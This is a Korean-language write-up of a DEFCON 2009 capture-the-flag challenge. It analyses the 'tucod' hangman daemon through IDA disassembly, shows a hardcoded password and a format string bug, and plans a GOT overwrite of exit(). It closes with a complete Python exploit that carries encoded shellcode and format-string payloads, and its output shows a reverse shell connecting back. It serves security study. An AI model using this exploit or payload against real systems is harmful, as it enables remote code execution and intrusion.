@@ -1,0 +1,470 @@
+---------------------------------------------------
+DEFCON 2009 Capture The Flag 본선 문제 풀이 - tucod
+
+
+
+by hkpco(박찬암)
+============================
+mail     - hkpco@korea.com
+homepage - http://hkpco.kr/
+group    - wowhacker&wowcode
+date     - 2009. 08. 07
+============================
+---------------------------------------------------
+
+
+
+1. [Before]
+
+올해 부터는 기존 CTF의 운영을 담당해오던 kenshoto가 물러나고 ddtek이 새로운 운영진으로 선정되었다. 덕분에 전체적인 운영에
+대한 방식이나 각 문제 개별의 스타일 혹은 수준 등에 어느정도 변화가 있었다. 본 문서에서는 tucod 바이너리에 대한 풀이를 기술
+할 것이며, IDA의 disassemble 결과를 통하여 진행하고자 한다. 특정 공격 기술에 대한 상세 설명이나 일반적인 루틴의 분석 혹은
+익스플로잇 당시의 시행착오 등과 같은 부가적인 설명은 되도록 제외하고 핵심적인 내용을 위주로 기술해 나갈 것이다.
+
+
+
+
+2. [Solution]
+
+file 명령을 통하여 대상 바이너리의 간략한 정보를 확인하였다.
+
+---------------------------------------------------------------------------------------------------------------------------
+$ file tucod
+tucod: ELF 32-bit LSB executable, Intel 80386, version 1 (FreeBSD), for FreeBSD 7.2, dynamically linked (uses shared libs),
+FreeBSD-style, stripped
+---------------------------------------------------------------------------------------------------------------------------
+
+
+동적 컴파일된 FreeBSD 7.2 바이너리이며, 디버깅 정보는 제거되어 있는것을 확인할 수 있다.
+데몬 서버의 포트 번호는 간단한 분석을 통하여 쉽게 확인할 수 있으므로 생략하고, 우선 서버로 접속하여 보자.
+
+--------------------
+$ nc localhost 57005
+Password: hkpco_test
+--------------------
+
+
+패스워드를 입력받는 것을 볼 수 있으며, 위와 같이 일치하지 않을 경우 종료한다. 이에 대한 루틴은 다음에서 볼 수 있다.
+
+>>>
+.text:08049C10                 push    ebp
+.text:08049C11                 mov     ebp, esp
+.text:08049C13                 sub     esp, 28h
+.text:08049C16                 mov     [esp+28h+var_24], offset aPassword ; "Password: "
+.text:08049C1E                 mov     eax, [ebp+arg_0]
+.text:08049C21                 mov     [esp+28h+var_28], eax
+.text:08049C24                 call    sub_8048F60
+// 소켓을 통하여 "Password: " 문자를 전송
+
+.text:08049C29                 mov     [esp+28h+var_1C], 0Ah
+.text:08049C31                 mov     [esp+28h+var_20], 0FFh
+.text:08049C39                 mov     [esp+28h+var_24], offset byte_804B380
+.text:08049C41                 mov     eax, [ebp+arg_0]
+.text:08049C44                 mov     [esp+28h+var_28], eax
+.text:08049C47                 call    sub_8048E20
+// 소켓을 통하여 버퍼에 255byte 입력
+
+.text:08049C4C                 mov     [ebp+var_4], eax
+.text:08049C4F                 cmp     [ebp+var_4], 0
+.text:08049C53                 jg      short loc_8049C61
+.text:08049C55                 mov     [ebp+var_14], 0
+.text:08049C5C                 jmp     loc_8049CFC
+.text:08049C61 ; ---------------------------------------------------------------------------
+.text:08049C61
+.text:08049C61 loc_8049C61:                            ; CODE XREF: sub_8049C10+43j
+.text:08049C61                 mov     eax, [ebp+var_4]
+.text:08049C64                 mov     ds:byte_804B380[eax], 0
+.text:08049C6B                 mov     [esp+28h+var_24], offset aHangemhigh ; "HANGEMHIGH!"
+.text:08049C73                 mov     [esp+28h+var_28], offset byte_804B380
+.text:08049C7A                 call    _strcmp
+// 입력한 값이 HANGEMHIGH! 인가를 비교
+<<<
+
+
+strcmp() 함수의 비교 루틴을 통하여 데몬의 패스워드는 "HANGEMHIGH!"인것을 확인할 수 있다.
+아래는 찾아낸 패스워드로 접속을 시도한 결과이다.
+
+---------------------------------------
+$ nc localhost 57005
+Password: HANGEMHIGH!
+Welcome to Hangman Blondie!
+What is your name? ChanAm
+Nice to meet you ChanAm prepare to die!
+
+   ---
+   | |
+     |
+     |
+     |
+     |
+ -----
+ |   |
+
+used:      ""
+available: "abcdefghijklmnopqrstuvwxyz"
+
+current: _________
+
+Your guess: a
+.
+.
+.
+Your guess: z
+
+   ---
+   | |
+   O |
+  /|\|
+   | |
+  / \|
+ -----
+ |   |
+
+
+Blondie, you missed, Tuco has hanged.
+The correct word is: lengthily.
+Play again (y/n)? n
+---------------------------------------
+
+
+입력받는 내용은 "패스워드, 이름, 추측 문자, 게임 재실행"으로 총 4가지 종류가 존재한다.
+그 중, 이름을 입력받는 루틴을 살펴보도록 하자.
+
+>>>
+.text:080496D0                 push    ebp
+.text:080496D1                 mov     ebp, esp
+.text:080496D3                 sub     esp, 38h
+.text:080496D6                 mov     [esp+38h+var_34], offset aWhatIsYourName ; "What is your name? "
+.text:080496DE                 mov     eax, [ebp+arg_0]
+.text:080496E1                 mov     [esp+38h+var_38], eax
+.text:080496E4                 call    sub_8048F60
+// 소켓을 통하여 "What is your name? " 문자를 전송
+
+.text:080496E9                 mov     [esp+38h+var_2C], 0Ah
+.text:080496F1                 mov     [esp+38h+var_30], 10h
+.text:080496F9                 lea     eax, [ebp+var_18]
+.text:080496FC                 mov     [esp+38h+var_34], eax
+.text:08049700                 mov     eax, [ebp+arg_0]
+.text:08049703                 mov     [esp+38h+var_38], eax
+.text:08049706                 call    sub_8048E20
+// 취약한 함수에 이용될 버퍼의 데이터를 입력받는 루틴
+
+.text:0804970B                 mov     [ebp+var_4], eax
+.text:0804970E                 cmp     [ebp+var_4], 0
+.text:08049712                 jg      short loc_8049720
+.text:08049714                 mov     [esp+38h+var_38], 0
+.text:0804971B                 call    _exit
+.text:08049720 ; ---------------------------------------------------------------------------
+.text:08049720
+.text:08049720 loc_8049720:                            ; CODE XREF: name_recv+42j
+.text:08049720                 mov     eax, [ebp+var_4]
+.text:08049723                 mov     [ebp+eax+var_18], 0
+.text:08049728                 mov     [esp+38h+var_34], offset aNiceToMeetYou ; "Nice to meet you "
+.text:08049730                 mov     eax, [ebp+arg_0]
+.text:08049733                 mov     [esp+38h+var_38], eax
+.text:08049736                 call    sub_8048F60
+
+.text:0804973B                 lea     eax, [ebp+var_18]
+.text:0804973E                 mov     [esp+38h+var_34], eax
+.text:08049742                 mov     eax, [ebp+arg_0]
+.text:08049745                 mov     [esp+38h+var_38], eax
+.text:08049748                 call    sub_8048F60
+// 취약성 발생 지점
+
+.text:0804974D                 mov     [esp+38h+var_34], offset aPrepareToDie ; " prepare to die!\n"
+.text:08049755                 mov     eax, [ebp+arg_0]
+.text:08049758                 mov     [esp+38h+var_38], eax
+.text:0804975B                 call    sub_8048F60
+.text:08049760                 leave
+.text:08049761                 retn
+.text:08049761 name_recv       endp
+<<<
+
+
+이름을 입력받은 다음 sub_8048F60 함수를 호출하는것을 볼 수 있다.
+해당 함수의 루틴은 다음과 같다. 중요한 루틴만을 살펴보도록 하겠다.
+
+>>>
+.text:08048F60                 push    ebp
+.text:08048F61                 mov     ebp, esp
+.text:08048F63                 sub     esp, 28h
+.text:08048F66                 mov     [ebp+var_4], 0
+.text:08048F6D                 mov     [ebp+var_8], 0
+.text:08048F74                 lea     eax, [ebp+arg_8]
+.text:08048F77                 mov     [ebp+var_C], eax
+.text:08048F7A                 mov     eax, [ebp+var_C]
+.text:08048F7D                 mov     [esp+28h+var_20], eax
+
+.text:08048F81                 mov     eax, [ebp+arg_4]
+.text:08048F84                 mov     [esp+28h+var_24], eax
+// 앞서 우리가 입력한 내용이 저장된 버퍼
+
+.text:08048F88                 lea     eax, [ebp+var_8]
+.text:08048F8B                 mov     [esp+28h+var_28], eax
+// send() 함수의 인자로 전달할 버퍼
+
+.text:08048F8E                 call    _vasprintf
+.
+.
+.text:08048FA8                 mov     eax, [ebp+var_8]
+.text:08048FAB                 mov     [esp+28h+var_20], 0
+.text:08048FB3                 mov     [esp+28h+var_24], eax
+.text:08048FB7                 mov     eax, [ebp+arg_0]
+.text:08048FBA                 mov     [esp+28h+var_28], eax
+.text:08048FBD                 call    sub_8048EA0
+.text:08048FC2                 mov     [ebp+var_4], eax
+// vasprintf() 함수를 통하여 저장된 버퍼를 위 함수의 인자로 전달(소켓 send 수행)
+<<<
+
+
+위 루틴에서 포멧 스트링 버그(Format String Bug, 이하 FSB)가 발생하게 되며, 이를 간단한 pseudo-code로 나타내면 다음과 같다.
+
+------------------------------------------------------------------------------------------------------
+recv( sockfd, buffer_1, size );
+// 소켓을 통해 임의의 데이터 입력
+
+vsaprintf( buffer_2, buffer_1, ... );
+// 입력받은 데이터와 주어진 스트링을 결합할 목적으로, vsaprintf() 함수를 통해 buffer_2에 종합하여 저장
+
+send( sockfd, buffer_2, size );
+// 저장된 내용을 소켓으로 전송
+------------------------------------------------------------------------------------------------------
+
+
+주석에서 설명한 것과 같이 vsaprintf() 함수는 바이너리 내부에 지정된 스트링과 사용자 임의의 문자열을 결합하여 전송하여 줄
+목적으로 이용되었으며, 이 과정에서 해당 함수의 사용 중에 %s, %x 등과 같은 포멧 스트링이 제대로 적용되지 않아서 FSB 취약성이
+발생하게 되는 것이다. 이제 해당 취약성을 이용하여 공격 코드를 구성하면 되겠지만, 그에 앞서 한 가지 문제가 있다. 다음과 같다.
+
+>>>
+.text:080496E9                 mov     [esp+38h+var_2C], 0Ah
+.text:080496F1                 mov     [esp+38h+var_30], 10h
+// 16byte 입력
+
+.text:080496F9                 lea     eax, [ebp+var_18]
+.text:080496FC                 mov     [esp+38h+var_34], eax
+.text:08049700                 mov     eax, [ebp+arg_0]
+.text:08049703                 mov     [esp+38h+var_38], eax
+.text:08049706                 call    sub_8048E20
+// sub_8048E20는 소켓을 통해 특정 바이트만큼 입력을 받는 일반적인 함수
+<<<
+
+
+위는 취약한 함수에 전달하기 위한 버퍼의 데이터를 입력받는 루틴으로 앞서 이미 보여주었다. 여기서 문제점은 공격 코드를
+구성할 버퍼의 크기가 16byte밖에 되지 않는다는 것이다. 일반적으로 해당 크기에 맞추어서 공격 코드를 구성하기가 불가능한
+것은 아니지만 이러한 공격의 성공 여부를 결정짓는 데에는 여러가지 환경적 요소가 많이 따른다. 실제로 $-flag 등의 다양한
+트릭을 이용하여 공격을 시도해 보았지만, 간소한 오프셋 상의 문제 때문에 공격이 제대로 성립되지 않았다.
+
+조금 더 전체적인 시각에서 수행되는 루틴을 살펴보게되면 다시금 또 다른 취약성을 발견할 수 있는데, 직접 루틴을 살펴볼 수도
+있겠지만 여기서는 간단하게 게임이 한 번 끝난 이후에 다음과 같은 실행상의 특징을 관찰하는 것으로 확인하도록 하겠다.
+
+---------------------------
+.
+.
+The correct word is: ripen.
+Play again (y/n)? y
+New Player (y/n)? y
+
+What is your name?
+// 취약한 함수 재 실행
+---------------------------
+
+
+위와 같이 게임을 재시작하게 되면 새로운 플레이어의 생성 유무를 선택할 수 있게 된다. y를 입력한 다음 취약한 함수를 한번 더
+수행하여 새로운 이름을 입력받을 수 있게 되고, 이는 공격 코드를 여러 루틴에 걸쳐서 16byte 단위로 분할하여 원하는 크기만큼
+구성할 수 있다는 말이 된다. 그럼 이제, 취약한 함수를 한번 더 수행하기 위하여 즉, 게임을 한번 더 수행하기 위해 기존의 게임을
+정상적으로 마쳐야 하는데, 이를 위해서 바이너리의 해당 루틴을 일일이 분석할 필요는 없다. 게임을 조금만 살펴보면 모든 알파벳
+소문자를 입력 받을 수 있도록 되어있으며, 특정 횟수까지 입력받아서 답을 맞추거나 혹은 그 안에 못 맞추게 될 경우 게임이 끝난
+뒤 재시작 할 것인지를 묻는 메시지가 나오게 된다. 그래서 모든 알파벳을 대상으로 게임의 재시작을 묻는 메시지가 나올 때 까지
+입력을 진행하면 된다.
+
+다음으로 return address 등의 EIP 변조가 가능한 주소 값을 공략해야 하며, 이는 다음 루틴에서 찾을 수 있다.
+
+>>>
+.text:08049BB2                 mov     [esp+28h+var_24], offset aInvalidGuessGo ; "Invalid guess, goodbye.\n"
+.text:08049BBA                 mov     eax, [ebp+arg_0]
+.text:08049BBD                 mov     [esp+28h+var_28], eax
+.text:08049BC0                 call    sub_8048F60
+
+.text:08049BC5                 mov     [esp+28h+var_28], 0
+.text:08049BCC                 call    _exit
+<<<
+
+
+알파벳을 추측하는 입력 루틴에 한 문자를 초과하거나 알파벳 범위를 벗어나는 입력을 할 경우 위와 같이 exit() 함수를 통하여
+접속한 클라이언트의 데몬 프로세스를 종료하게 된다.
+
+이제, exit() 함수의 Global Offset Table(이하 GOT)을 쉘코드가 저장되어진 주소로 변환한 다음 위 루틴을 유도하여 원하는 코드를
+실행 시키도록 공격 코드를 구성할 것이다. exit() 함수의 GOT은 다음과 같이 구할 수 있다.
+
+---------------------------------------------
+# objdump -R tucod
+
+tucod:     file format elf32-i386-freebsd
+
+DYNAMIC RELOCATION RECORDS
+OFFSET   TYPE              VALUE
+0804b360 R_386_COPY        __mb_sb_limit
+0804b364 R_386_COPY        _CurrentRuneLocale
+0804b2ac R_386_JUMP_SLOT   setuid
+0804b2b0 R_386_JUMP_SLOT   seteuid
+...
+0804b330 R_386_JUMP_SLOT   exit
+...
+---------------------------------------------
+
+
+쉘코드를 저장할 수 있는 공간은 다음 루틴의 분석을 통하여 확보할 수 있다.
+
+>>>
+.text:08049C16                 mov     [esp+28h+var_24], offset aPassword ; "Password: "
+.text:08049C1E                 mov     eax, [ebp+arg_0]
+.text:08049C21                 mov     [esp+28h+var_28], eax
+.text:08049C24                 call    sub_8048F60
+// 소켓을 통하여 "Password: " 문자열 전송
+
+.text:08049C29                 mov     [esp+28h+var_1C], 0Ah
+.text:08049C31                 mov     [esp+28h+var_20], 0FFh
+.text:08049C39                 mov     [esp+28h+var_24], offset byte_804B380
+.text:08049C41                 mov     eax, [ebp+arg_0]
+.text:08049C44                 mov     [esp+28h+var_28], eax
+.text:08049C47                 call    sub_8048E20
+// 0804B380h 주소 공간에 0FFh(255byte) 크기만큼 입력
+<<<
+
+
+위와 같이, 데몬 초기에 패스워드를 입력받는 루틴에서 쉘 코드의 저장을 위한 상대적으로 여유로운 공간을 확보할 수 있다.
+하지만 해당 공간은 패스워드 입력 및 비교에 쓰이기 때문에 다음과 같이 데이터를 구성해야 한다.
+
+--------------------------------
+[Password][Null_Byte][Shellcode]
+--------------------------------
+
+
+이후, 패스워드는 strcmp() 함수를 통하여 비교가 이루어지므로 대부분의 문자열 관련 함수가 null_byte를 끝으로 인지하는 특성상
+해당 비교는 무사히 통과할 수 있게 된다. 그 다음, 쉘 코드가 저장된 주소는 패스워드와 null_byte 만큼의 오프셋이 더해진 위치가
+되어야 할 것이다.
+
+이로써 공격을 위한 최종 Payload는 다음과 같다.
+
+=============================================================================================
+1>  [Password][Null_Byte][Shellcode]
+2>  exit 함수의 상위/하위 2byte를 shellcode가 위치한 주소의 상위/하위 2byte로 덮는 FSB 코드_1
+3>  게임 재시작 메시지가 나올 때 까지 알파벳 a-z를 입력
+4>  재시작 메시지가 나왔다면, y를 입력
+5>  새로운 플레이어를 원하는 질문 메시지가 나왔다면, y를 입력
+6>  exit 함수의 상위/하위 2byte를 shellcode가 위치한 주소의 상위/하위 2byte로 덮는 FSB 코드_2
+7>  게임 비정상 종료를 위한 문자열 입력
+=============================================================================================
+
+
+다음은 해당 공격 코드를 기반으로 만들어진 익스플로잇을 실행한 결과이다.
+
+----------
+TERMINAL 1
+---------------------------
+$ python tuco_exp.py
+Password:
+Welcome to Hangman Blondie!
+
+What is your name?
+[+] alphabet(a)
+[+] alphabet(b)
+[+] alphabet(c)
+[+] alphabet(d)
+[+] alphabet(e)
+[+] alphabet(f)
+[+] alphabet(g)
+[+] alphabet(h)
+[+] alphabet(i)
+New Player (y/n)?
+What is your name?
+Nice to meet you 0
+...
+[+] exploit exit
+---------------------------
+
+----------
+TERMINAL 2
+-----------------------------------------------
+$ nc -l 7777
+id
+uid=1006(tuco) gid=1006(tuco) groups=1006(tuco)
+-----------------------------------------------
+
+성공적으로 공격이 수행된 것을 확인할 수 있다.
+
+
+
+
+3. [Exploit]
+
+익스플로잇은 Python으로 간단히 작성되었으며, 세련된 코딩 기법은 전혀 고려하지 않았다. 코드의 중간 중간에 지연시간을 준 것은
+원격 서버에서 통신이 늦어질 때 전송한 데이터가 한 번에 전달되지 못할 경우를 위해서이다. 참고로 telnetlib 모듈을 사용하면
+코딩이 더 편해지겠지만, 이로는 정상적인 통신이 진행되지 않는다.
+
+- tuco_exp.py -
+
+# tucod exploit by hkpco
+from socket import *
+import time
+
+target	= '192.168.40.26'
+port	= 57005
+
+pay_name = "HANGEMHIGH!" + "\x00" + "\x90"*64 + "\xb8\x67\x25\x8b\x3b\x2b\xc9\xb1\x11\xdb\xc8\xd9\x74\x24\xf4\x5f\x31\x47\x0e\x03\x47\x0e\x83\x88\xd9\x69\xce\x3e\xe2\xc6\x19\xa4\x8a\xe9\x58\xc6\x2b\x9f\xba\xc7\x6b\xcf\x2e\x26\x06\xf2\xc4\x38\x66\x93\xd5\xb8\xd1\x04\xb6\xd2\xbf\xfc\xfb\xa2\x10\x97\x59\xfa\x5d\xe7\xa1\xb5\xb5\x91\xab\x21\x69\x4d\x27\xd9\x1d\xbe\xa5\x70\xb0\x49\xca\xd2\x18\x19\x5d\x62\x9b\x50\xdd" + "\n"
+pay_a    = "\x32\xb3\x04\x08" + "%2048c%7$hn" + "\n"
+pay_b    = "\x30\xb3\x04\x08" + "%45980c%7$hn" + "\n"
+# 0x0804b330 R_386_JUMP_SLOT   exit
+
+words = "abcdefghijklmnopqrstuvwxyz"
+
+sockfd = socket( AF_INET, SOCK_STREAM )
+sockfd.connect((target, port))
+
+print sockfd.recv(10240)
+sockfd.send(pay_name)
+# 1
+
+print sockfd.recv(10240)
+sockfd.send(pay_a)
+# 2
+
+print sockfd.recv(10240)
+
+for ch in words:
+	time.sleep(0.2)
+	sockfd.send(ch+'\n')
+
+	buffer = sockfd.recv(10240)
+	time.sleep(0.1)
+	buffer2 = sockfd.recv(10240)
+
+	if buffer.find('Play again') != -1 or buffer2.find('Play again') != -1:
+		time.sleep(0.2)
+		sockfd.send("y\n")
+
+		time.sleep(0.2)
+		buffer = sockfd.recv(1024)
+		print buffer
+
+		if buffer.find('New Player') != -1:
+			time.sleep(0.2)
+			sockfd.send('y\n')
+
+			time.sleep(0.2)
+			buffer = sockfd.recv(10240)
+			print buffer
+
+			sockfd.send(pay_b)
+			time.sleep(0.2)
+
+			sockfd.send("hk\n");
+			# abnormal exit
+
+			time.sleep(0.2)
+			print sockfd.recv(10240)
+			exit(-1)
+
+	print 'alphabet(' +ch+ ')'
+
+print 'loop end'
